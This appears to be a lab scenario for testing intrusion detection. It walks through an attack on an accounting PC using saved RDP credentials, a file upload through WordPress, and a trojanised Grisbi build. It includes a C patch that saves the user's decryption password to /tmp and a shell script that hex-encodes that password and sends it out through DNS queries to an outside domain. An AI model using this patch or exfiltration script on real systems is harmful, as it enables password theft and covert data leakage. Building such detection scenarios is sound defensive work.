# Accounting data leak

**For educational purposes only!**

**Warning:** This scenario could trigger the IDS detections on your network.

### Setup
- compromised AdminPC
  - VM or VPS connected to IDS-Lab via wireguard
  - attacker access to this AdminPC
  - stored RDP connection to the `accounting.` desktop with credentials `abc:abc`
- Accounting-PC
  - docker container
  - installed grisbi, xxd and host:
```
sudo apt-get update
sudo apt-get install -y grisbi xxd host
```
  - created encrypted grisbi file with some "confidential" data and secret password

### Scenario
- attacker reviews AdminPC's Remote Desktop Connection and finds the saved connection
- accounting .gsb file is encrypted, but the attacker exfiltrate the file and tries to crack the password by bruteforce (somehow)
  - RDP shared drive from AdminPC doesn't work
  - the attacker can find the misconfiguration
    - Accounting-PC has access to the wordpress website, so he could upload the .gsb file there (he already know the admin password)
    - or, the attacker can upload .gsb file to the Internet (however, we assume that the Accounting-PC doesn't have access to the Internet outside of IDS-Lab)
- obtaining the grisbi password:
  - attacker can use keylogger on Accounting-PC, or
  - attacker can create patched version of grisbi, which saves the password somewhere (default scenario)
- patched version of grisbi, patch function `gsb_file_util_ask_for_crypt_key`:
  - on the Attacker's PC: 
```
apt-get install grisbi
apt-get install devscripts dpkg-dev vim
apt-get build-dep grisbi
apt-get source grisbi
cd grisbi-2.0.5/
# write your own pach to the end of `gsb_file_util_ask_for_crypt_key` function
vim src/plugins/openssl/openssl.c
apt build-dep grisbi
# build .deb package if needed
debuild -b -uc -us 
# or use only the modified version of grisbi binary
cp debian/grisbi/usr/bin/grisbi /usr/local/bin/
```

  - transfer patched grisbi binary to the Accounting-PC (e.g. via wordpress)
- *(optionally)* monitor changes in the password/keylog file and exfiltrate the data via DNS
  - the example of monitoring script below converts the captured password to hexadecimal string and exfiltrates it via DNS. DNS query of type X25 to the domain in the form of `[two chars + two digits].com` is needed to trigger Suricata detection **ET MALWARE DNSG - Data Exfiltration via DNS** (sid:2028631)

### Examples
- grisbi patch
```
    ...
    gtk_widget_destroy ( dialog );
    
    if (key != NULL)
    {
        FILE *fptr;
        fptr = fopen("/tmp/grisbi-password.txt", "w");
        fprintf(fptr, "%s", key);
        fclose(fptr);
    }

    return key;
}
...
```
- monitor for password file
```
#!/bin/sh

inotifywait -e close_write -m --include 'grisbi-password\.txt' /tmp/ |
    while read path action file; do
        pass=$(xxd -p ${path}/${file})
	host -t X25 ${pass}.sa24.com 8.8.8.8
    done
```
